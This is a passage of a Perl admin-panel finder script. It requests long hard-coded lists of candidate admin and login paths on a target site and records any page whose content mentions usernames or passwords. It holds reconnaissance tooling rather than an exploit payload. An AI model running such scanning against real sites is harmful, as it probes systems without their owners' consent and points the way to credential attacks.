        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
        'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
        'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
        'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
        'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{ 
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "4"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
        'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
        'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
        'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
        'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
        'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
        'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
        'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
        'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>hits.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }

        if($code eq "3"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx',
        'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.aspx','admin.aspx','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx',
        'administrator/account.aspx','administrator.aspx','admin_area/admin.html','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx',
        'moderator/admin.aspx','acceso.aspx','account.aspx','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.aspx','admincontrol.aspx',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.aspx','adminarea/index.html','adminarea/admin.html',
        'webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.aspx','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.aspx','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','admin.aspx','adminarea/index.aspx',
        'adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx',
        'modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','usuarios/login.aspx',
        'adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>hits.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "5"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
        'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
        'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
        'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
        'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
        'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
        'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
        'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }

        if($code eq "6"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
        'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
        'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
        'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
        'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
        'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
        'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
        'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "7"){

        @path2=('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
        'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
        'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
        'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
        'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
        'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
        'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
        'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }


        if($code eq "8"){

        @path2=('login.htm','login.html','login/','adm/','admin/','admin/account.html','admin/login.html','admin/login.htm','admin/controlpanel.html','admin/controlpanel.htm','admin/adminLogin.html','admin/adminLogin.htm','admin.htm','admin.html','adminitem/','adminitems/','administrator/','administration/','adminLogin/','admin_area/','manager/','letmein/','superuser/','access/','sysadm/','superman/','supervisor/','control/','member/','members/','user/','cp/','uvpanel/','manage/','management/','signin/','log-in/','log_in/','sign_in/','sign-in/','users/','accounts/','wp-login.php','bb-admin/admin.html','relogin.htm','relogin.html','registration/','moderator/','controlpanel/','fileadmin/','admin1.html','admin1.htm','admin2.html','yonetim.html','yonetici.html','phpmyadmin/','myadmin/','ur-admin/','Server/','wp-admin/','administr8/','webadmin/','administratie/','admins/','administrivia/','Database_Administration/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','power_user/','system_administration/','ss_vms_admin_sm/','bb-admin/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','pages/admin/','admincp/','adminarea/','admincontrol/','modules/admin/','siteadmin/','adminsite/','kpanel/','vorod/','vorud/','adminpanel/','PSUser/','secure/','webmaster/','security/','usr/','root/','secret/','moderator.php','moderator.html','0admin/','0manager/','aadmin/','login_admin/','login_out/','loginerror/','loginok/','loginsave/','loginsuper/','logout/','secrets/','super1/','supervise/','admin1.php','admin1.html','admin2.php','admin2.html','yonetim.php','yonetim.html','yonetici.php','yonetici.html','adm/','admin/','admin/account.php','admin/account.html','admin/index.php','admin/index.html','admin/login.php','admin/login.html','admin/home.php','admin/controlpanel.html','admin/controlpanel.php','admin.php','admin.html','admin/cp.php','admin/cp.html','cp.php','cp.html','administrator/','administrator/index.html','administrator/index.php','administrator/login.html','administrator/login.php','administrator/account.html','administrator/account.php','administrator.php','administrator.html','login.php','login.html','modelsearch/login.php','moderator.php','moderator.html','moderator/login.php','moderator/login.html','moderator/admin.php','moderator/admin.html','moderator/','account.php','account.html','controlpanel/','controlpanel.php','controlpanel.html','admincontrol.php','admincontrol.html','adminpanel.php','adminpanel.html','admin1.asp','admin2.asp','yonetim.asp','yonetici.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/home.asp','admin/controlpanel.asp','admin.asp','admin/cp.asp','cp.asp','administrator/index.asp','administrator/login.asp','administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','moderator/admin.asp','account.asp','controlpanel.asp','
        admincontrol.asp','adminpanel.asp','fileadmin/','fileadmin.php','fileadmin.asp','fileadmin.html','administration/','administration.php','administration.html','sysadmin.php','sysadmin.html','phpmyadmin/','myadmin/','sysadmin.asp','sysadmin/','ur-admin.asp','ur-admin.php','ur-admin.html','ur-admin/','Server.php','Server.html','Server.asp','Server/','wp-admin/','administr8.php','administr8.html','administr8/','administr8.asp','webadmin/','webadmin.php','webadmin.asp','webadmin.html','administratie/','admins/','admins.php','admins.asp','admins.html','administrivia/','Database_Administration/','WebAdmin/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cPanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','members/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','admin_area/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','server/','database_administration/','power_user/','system_administration/','ss_vms_admin_sm/','adiministrador/','adm/','adimin/','login/','logout/','senha/','membros/','usuarios/','senhas/','sff/','saff/','donos/','noticias/','not/','painel/','administracao/','key/','edit/','config/','funcoes/','sistema/','php/','net/','controle','controles','membro','membros','acesso','senha','usuario','usuarios','admistrador','adimistrador','painel','root','roots','raiz','login.htm','login.html','login/','adm/','admin/','admin/account.html','admin/login.html','admin/login.htm','admin/controlpanel.html','admin/controlpanel.htm','admin/adminLogin.html','admin/adminLogin.htm','admin.htm','admin.html','adminitem/','adminitems/','administrator/','administration/','adminLogin/','admin_area/','manager/','letmein/','superuser/','access/','sysadm/','superman/','supervisor/','control/','member/','members/','user/','cp/','uvpanel/','manage/','management/','signin/','log-in/','log_in/','sign_in/','sign-in/','users/','accounts/','wp-login.php','bb-admin/admin.html','relogin.htm','relogin.html','registration/','moderator/','controlpanel/','fileadmin/','admin1.html','admin1.htm','admin2.html','yonetim.html','yonetici.html','phpmyadmin/','myadmin/','ur-admin/','Server/','wp-admin/','administr8/','webadmin/','administratie/','admins/','administrivia/','Database_Administration/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','power_user/','system_administration/','ss_vms_admin_sm/','bb-admin/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','pages/admin/','admincp/','adminarea/','admincontrol/','modules/admin/','siteadmin/','adminsite/','kpanel/','vorod/','vorud/','adminpanel/','PSUser/','secure/','webmaster/','security/','usr/','root/','secret/','moderator.php','moderator.html','0admin/','0manager/','aadmin/','login_admin/','login_out/','loginerror/','loginok/','loginsave/','loginsuper/','logout/','secrets/','super1/','supervise/','admin.php','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php','joomla/administrator','login.php','admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.